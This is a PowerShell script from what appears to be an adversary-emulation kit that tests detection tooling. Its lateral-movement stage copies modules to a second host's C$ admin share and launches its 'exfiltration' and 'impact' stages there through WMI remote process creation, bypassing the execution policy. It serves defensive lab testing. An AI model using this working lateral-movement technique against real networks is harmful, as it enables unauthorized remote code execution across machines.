# ============================================================================
# Stage4-LateralMovement.ps1
# MITRE: T1021.002 SMB / Admin Shares | T1570 Lateral Tool Transfer
#        T1047 Windows Management Instrumentation (remote process create)
# ----------------------------------------------------------------------------
# Copies the staged BENIGN emulation modules to Target 2's C$ admin share, then
# uses WMI (Win32_Process.Create) to launch the exfiltration + impact modules
# ON Target 2. Nothing arbitrary is executed remotely - only this kit's own
# benign modules that were just copied over.
#
# This is the stage that produces a genuine cross-device story for Threat Tracer
# (guide 8.1, SC-07): host A writes to host B's admin share and spawns a process
# on host B.
#
# Requires a reachable second host with SMB (445) and WMI/DCOM (135 + dynamic
# RPC) open, and rights to its admin share. Use isolated, snapshotted lab hosts
# only. In the CBX-US lab keep this off the MS_ and BH_ device groups.
#
# If you have no second host, pass -LocalSimulation to run stages 5 and 6 on the
# current host instead (you lose the cross-device graph but keep exfil + impact).
# ============================================================================
[CmdletBinding()]
param(
    [string]$RemoteTarget,
    [switch]$PromptCredentials,
    [string]$Username,
    [string]$Password,
    [switch]$LocalSimulation,
    [string]$CanaryPath
)

if (-not (Get-Command Write-Step -ErrorAction SilentlyContinue)) {
    function Write-Step($m){ Write-Host "[$((Get-Date).ToString('yyyy-MM-dd HH:mm:ss.fff'))] $m" -ForegroundColor Yellow }
    function Write-Stage($t){ Write-Host "`n==== $t  START $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss.fff'))" -ForegroundColor Cyan }
    function Write-StageEnd($t){ Write-Host "==== $t  END   $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss.fff'))`n" -ForegroundColor Cyan }
    function Write-Info($m){ Write-Host "        $m" -ForegroundColor DarkGray }
}
$stagingDir = if ($CBXEmu) { $CBXEmu.StagingDir } else { 'C:\Users\Public\staging' }

Write-Stage "STAGE 4 - LATERAL MOVEMENT (SMB + WMI)"

$here = Split-Path -Parent $MyInvocation.MyCommand.Path

# ---- Local simulation path: no second host ----
if ($LocalSimulation -or [string]::IsNullOrWhiteSpace($RemoteTarget)) {
    Write-Info "No RemoteTarget (or -LocalSimulation): running exfil + impact on THIS host."
    Write-Info "Cross-device Threat Tracer graph will not be produced in this mode."
    & (Join-Path $here 'Stage5-Exfiltration.ps1')
    $s6args = @{ Force = $true }   # chained run is non-interactive; skip the "Type YES" prompt
    if (-not [string]::IsNullOrWhiteSpace($CanaryPath)) { $s6args['CanaryPath'] = $CanaryPath }
    & (Join-Path $here 'Stage6-Impact.ps1') @s6args
    Write-StageEnd "STAGE 4 - LATERAL MOVEMENT (local simulation)"
    return
}

# ---- Optional explicit credentials ----
$cred = $null
if ($Username -and $Password) {
    $cred = [PSCredential]::new($Username, (ConvertTo-SecureString $Password -AsPlainText -Force))
} elseif ($PromptCredentials) {
    Write-Info "Enter lab admin credentials for $RemoteTarget"
    $cred = Get-Credential
}

# ---- T1021.002 / T1570: copy this kit's benign modules to the admin share ----
# New-PSDrive maps the admin share under the supplied credential so that Test-Path
# and Copy-Item (which don't accept -Credential for UNC paths) use the right token.
$tmpDrive = $null
$remoteStaging = "\\$RemoteTarget\C`$\Users\Public\staging"
Write-Step "Connecting to admin share on $RemoteTarget (T1021.002)"
try {
    if ($cred) {
        $tmpDrive = 'CBXStage'
        New-PSDrive -Name $tmpDrive -PSProvider FileSystem -Root "\\$RemoteTarget\C$" `
                    -Credential $cred -ErrorAction Stop | Out-Null
        $remoteStaging = "${tmpDrive}:\Users\Public\staging"
    }
    if (-not (Test-Path $remoteStaging)) {
        New-Item -ItemType Directory -Force -Path $remoteStaging -ErrorAction Stop | Out-Null
    }
    Copy-Item -Path (Join-Path $stagingDir '*') -Destination $remoteStaging -Recurse -Force -ErrorAction Stop
    Write-Step "Copied benign modules + sample data to $remoteStaging (T1570)"
} catch {
    Write-Step "SMB copy failed: $($_.Exception.Message)"
    Write-Info "Check that 445/135 are open and the admin share is reachable, then retry."
    Write-StageEnd "STAGE 4 - LATERAL MOVEMENT (failed)"
    throw
} finally {
    if ($tmpDrive) { Remove-PSDrive -Name $tmpDrive -Force -ErrorAction SilentlyContinue }
}

# ---- T1047: use WMI to launch the benign staged modules on Target 2 ----
# Invoke-CimMethod does not accept -Credential; credentials must travel via a CimSession.
# Win32_Process.Create CommandLine is passed straight to CreateProcess -- semicolons are not
# command separators there. Use -Command with & so PowerShell's own ; chains the two scripts.
$remoteCmd = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "& ''C:\Users\Public\staging\Stage5-Exfiltration.ps1''; & ''C:\Users\Public\staging\Stage6-Impact.ps1'' -Force"'
Write-Step "Invoking Win32_Process.Create on $RemoteTarget (T1047)"
$cimSession = $null
try {
    if ($cred) {
        $cimSession = New-CimSession -ComputerName $RemoteTarget -Credential $cred -ErrorAction Stop
    }
    $cimParams = @{ ClassName = 'Win32_Process'; MethodName = 'Create'
                    Arguments = @{ CommandLine = $remoteCmd } }
    if ($cimSession) { $cimParams['CimSession'] = $cimSession } else { $cimParams['ComputerName'] = $RemoteTarget }
    $result = Invoke-CimMethod @cimParams
    if ($result.ReturnValue -eq 0) {
        Write-Step "Remote process creation accepted on $RemoteTarget (PID $($result.ProcessId)); child-stage completion is not confirmed by Win32_Process.Create."
    } else {
        throw "Win32_Process.Create returned $($result.ReturnValue) on $RemoteTarget."
    }
} catch {
    Write-Step "WMI invocation failed: $($_.Exception.Message)"
    throw
} finally {
    if ($cimSession) { Remove-CimSession $cimSession -ErrorAction SilentlyContinue }
}

Write-StageEnd "STAGE 4 - LATERAL MOVEMENT"